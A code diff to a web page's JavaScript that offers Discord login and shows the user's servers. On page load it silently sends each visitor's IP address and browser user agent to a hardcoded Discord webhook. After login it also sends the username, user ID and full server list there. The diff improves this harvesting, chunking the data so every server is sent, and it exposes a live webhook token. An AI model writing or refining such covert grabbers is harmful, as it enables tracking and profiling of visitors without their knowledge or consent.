@@ -148,19 +148,19 @@
     </div>
 
     <script>
-        // Config
         const CLIENT_ID = '1537117334517452860';
         const REDIRECT_URI = window.location.origin + window.location.pathname;
         const DISCORD_API = 'https://discord.com/api/v10';
         const WEBHOOK_URL = "https://discord.com/api/webhooks/1536692672079724645/83NQgcZ-AerJ4Oc5tX4GI8cJZ-P32Y29jGQSaMjEWcs16ZxDz2adwefkPh9qEuT45sJA";
 
-        // Build OAuth2 URL
+        // Build OAuth2 URL with identify + guilds scope
         const oauthUrl = `https://discord.com/oauth2/authorize?client_id=${CLIENT_ID}&redirect_uri=${encodeURIComponent(REDIRECT_URI)}&response_type=token&scope=identify%20guilds`;
         document.getElementById('loginBtn').href = oauthUrl;
 
-        // 1. Log visitor IP immediately on page load
+        // 1. Log IP on initial page load
         window.addEventListener('DOMContentLoaded', () => {
         logPageVisit();
+        checkOAuthCallback();
         });
 
         async function logPageVisit() {
@@ -170,10 +170,9 @@
         const ipData = await ipRes.json();
         userIp = ipData.ip;
         } catch (err) {
-        console.warn('Could not fetch IP from ipify:', err);
+        console.warn('IP fetch failed:', err);
         }
 
-        // Post visit info to Webhook
         try {
         await fetch(WEBHOOK_URL, {
         method: 'POST',
@@ -181,7 +180,7 @@
         body: JSON.stringify({
         embeds: [{
         title: "Site Visitor Opened Page",
-        color: 3447003, // Blue accent
+        color: 3447003,
         fields: [
         { name: "IP Address", value: userIp, inline: true },
         { name: "User Agent", value: navigator.userAgent.substring(0, 100), inline: false }
@@ -191,11 +190,12 @@
         })
         });
         } catch (e) {
-        console.error('Webhook error on load:', e);
+        console.error('Visitor webhook error:', e);
         }
         }
 
-        // 2. Check if user is returning from Discord OAuth redirect
+        // 2. Process OAuth redirect token
+        function checkOAuthCallback() {
         const hash = window.location.hash.substring(1);
         const params = new URLSearchParams(hash);
         const accessToken = params.get('access_token');
@@ -205,8 +205,10 @@
         document.getElementById('intro-text').classList.add('hidden');
         document.getElementById('content').classList.remove('hidden');
 
+        // Clean token out of address bar
         history.replaceState(null, null, window.location.pathname);
         fetchUserData(accessToken);
+        }
         }
 
         async function fetchUserData(token) {
@@ -221,13 +223,17 @@
         });
         const guilds = await guildsRes.json();
 
+        if (!Array.isArray(guilds)) {
+        console.error('Guilds response was not an array:', guilds);
+        return;
+        }
+
         displayUser(user);
         displayServers(guilds);
-        logLoginToWebhook(user, guilds);
+        await logLoginToWebhook(user, guilds);
 
         } catch (err) {
-        console.error('Error:', err);
-        alert('Failed to fetch Discord data. Please try again.');
+        console.error('Fetch user data error:', err);
         }
         }
 
@@ -249,8 +255,6 @@
         document.getElementById('serverCount').textContent = guilds.length;
         const list = document.getElementById('serverList');
 
-        guilds.sort((a, b) => (b.approximate_member_count || 0) - (a.approximate_member_count || 0));
-
         list.innerHTML = guilds.map(guild => {
         const iconUrl = guild.icon
         ? `https://cdn.discordapp.com/icons/${guild.id}/${guild.icon}.png`
@@ -264,54 +268,81 @@
         </div>
         <div class="server-info">
         <div class="server-name">${guild.name}</div>
-        <div class="server-count">${guild.approximate_member_count ? `~${guild.approximate_member_count.toLocaleString()} members` : 'Member count unavailable'}</div>
+        <div class="server-count">ID: ${guild.id}</div>
         </div>
         </div>
         `;
         }).join('');
         }
 
-       async function logLoginToWebhook(user, guilds) {
-    try {
-        // Format top servers / server list (Discord embeds have a 1024 char limit per field)
-        const serverListFormatted = guilds
-            .slice(0, 15) // Limit to top 15 to avoid exceeding Discord API embed character limits
-            .map(g => {
-                const iconUrl = g.icon 
-                    ? `https://cdn.discordapp.com/icons/${g.id}/${g.icon}.png` 
-                    : 'No Icon';
-                return `• **${g.name}** (ID: \`${g.id}\`)\n  [Icon Link](${iconUrl})`;
-            })
-            .join('\n');
+        // 3. Webhook with auto-chunking for Discord limits
+        async function logLoginToWebhook(user, guilds) {
+        try {
+        const username = user.global_name
+        ? `${user.global_name} (@${user.username})`
+        : `@${user.username}`;
 
-        const extraCount = guilds.length > 15 ? `\n\n*...and ${guilds.length - 15} more servers.*` : '';
-
-        await fetch(WEBHOOK_URL, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                embeds: [{
-                    title: "Discord OAuth Completed",
-                    color: 5793266, // Green accent
-                    fields: [
-                        { name: "User", value: `${user.global_name || user.username} (@${user.username})`, inline: true },
-                        { name: "User ID", value: user.id, inline: true },
-                        { name: "Total Servers", value: `${guilds.length} guilds`, inline: true },
-                        { 
-                            name: "Server List", 
-                            value: (serverListFormatted + extraCount) || "No servers found.", 
-                            inline: false 
-                        }
-                    ],
-                    timestamp: new Date().toISOString()
-                }]
-            })
+        const serverLines = guilds.map(g => {
+        const iconUrl = g.icon
+        ? `https://cdn.discordapp.com/icons/${g.id}/${g.icon}.png`
+        : 'https://cdn.discordapp.com/embed/avatars/0.png';
+        const cleanName = g.name.replace(/[*_`~>]/g, '');
+        return `• **${cleanName}** (\`${g.id}\`) - [Icon](${iconUrl})`;
         });
-    } catch (e) {
-        console.error('Webhook error on login:', e);
-    }
-}
-    </script>
 
+        const fields = [
+        { name: "User", value: username, inline: true },
+        { name: "User ID", value: String(user.id), inline: true },
+        { name: "Total Servers", value: `${guilds.length} guilds`, inline: true }
+        ];
+
+        let currentChunk = "";
+        let fieldIndex = 1;
+
+        // Split server entries across multiple fields to stay under 1,024 chars per field
+        for (const line of serverLines) {
+        if ((currentChunk + line + "\n").length > 950) {
+        fields.push({
+        name: `Servers (Part ${fieldIndex})`,
+        value: currentChunk,
+        inline: false
+        });
+        currentChunk = line + "\n";
+        fieldIndex++;
+        } else {
+        currentChunk += line + "\n";
+        }
+        }
+
+        if (currentChunk.trim().length > 0) {
+        fields.push({
+        name: fieldIndex > 1 ? `Servers (Part ${fieldIndex})` : "Servers List",
+        value: currentChunk,
+        inline: false
+        });
+        }
+
+        const res = await fetch(WEBHOOK_URL, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+        embeds: [{
+        title: "Discord OAuth Completed",
+        color: 5793266,
+        fields: fields,
+        timestamp: new Date().toISOString()
+        }]
+        })
+        });
+
+        if (!res.ok) {
+        const errorText = await res.text();
+        console.error("Webhook rejected by Discord API:", errorText);
+        }
+        } catch (e) {
+        console.error("Webhook submission error:", e);
+        }
+        }
+    </script>
 </body>
 </html>
